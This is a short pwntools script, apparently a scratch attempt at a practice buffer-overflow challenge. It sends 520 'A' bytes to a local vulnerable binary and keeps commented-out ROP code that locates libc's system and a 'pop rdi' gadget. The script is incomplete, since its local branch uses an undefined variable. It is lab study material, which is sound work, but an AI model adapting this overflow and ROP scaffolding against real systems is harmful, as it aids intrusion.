#!/usr/bin/python3

# created by crazicrafter1

import time
from pwn import *
import struct

# https://trustie.medium.com/sick-rop-htb-pwn-challenge-9b1310d9a6b#bef6

#vuln_elf = ELF('./simple_bof')

# Start local program
if args.R:
    p = remote(host='127.0.0.1', port=1337)
    #p = remote(host='192.168.190.131', port=2463)
else:
    p = vuln_elf.process()

context.clear(arch='amd64')
context.log_level = 'debug'

#my_listen_socket = listen(2463, bindaddr='192.168.190.1')

# blocks until netcat
#p = my_listen_socket.wait_for_connection()

#p = connect(host='192.168.190.131', port=2463)
#p = connect(host='127.0.0.1', port=1337)

payload = b'A' * 520
#payload += struct.pack('I', 0xCAFEFACE)

# leave is causing stack ptr to change
# 512 + 1 + 

#stack frames causing issues
#gcc simple_bof_2.c -o simple_bof_2 -fno-stack-protector -fno-pie -z execstack -fomit-frame-pointer

#payload = b'HELLO WORLD'

#payload = b'A' * 8

p.sendline(payload)
print(p.recvline())

p.close()

"""
vuln_file = './sick_rop'
libc_file = '/usr/lib/x86_64-linux-gnu/libc.so.6'
context(arch='amd64')

vuln_elf = ELF(vuln_file)
#p = process(vuln_file)

libc_elf = ELF(libc_file)
print(libc_elf.symbols.get('system'))

rop = ROP([vuln_elf, libc_elf])
#rop.ga

print(libc_elf.symbols[rop.find_gadget(['pop rdi', 'ret']).address])
"""